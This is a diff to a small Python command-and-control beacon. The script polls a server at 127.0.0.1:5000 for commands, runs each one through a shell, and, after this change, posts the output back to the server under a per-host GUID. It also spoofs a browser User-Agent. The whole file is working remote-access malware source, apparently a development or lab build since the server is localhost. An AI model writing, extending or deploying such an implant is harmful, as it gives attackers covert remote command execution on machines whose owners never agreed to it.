@@ -4,7 +4,7 @@ import time
 import uuid
 import base64
 
-def bleh(beacon_command):
+def bleh(beacon_command, GUID):
     """
     This takes in a string to execute
     Returns the output if any available
@@ -15,13 +15,15 @@ def bleh(beacon_command):
     process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     out, err = process.communicate()
     out = out.decode()
-    return out
+    requests.post(f'http://localhost:5000/{GUID}', data=out, headers=headers)
 
 GUID = uuid.uuid4()
 GUID = GUID.int
 process = subprocess.Popen('hostname', close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
 out, err = process.communicate()
 hostname = out.decode()
+hostname = str(hostname)
+hostname = hostname.strip()
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 ',
@@ -36,6 +38,6 @@ while 1:
     a = requests.get(f'http://127.0.0.1:5000/{GUID}.html', headers=headers)
     cmd = a.text
     print('got command')
-    bleh(cmd)
+    bleh(cmd, GUID)
 
     time.sleep(5)
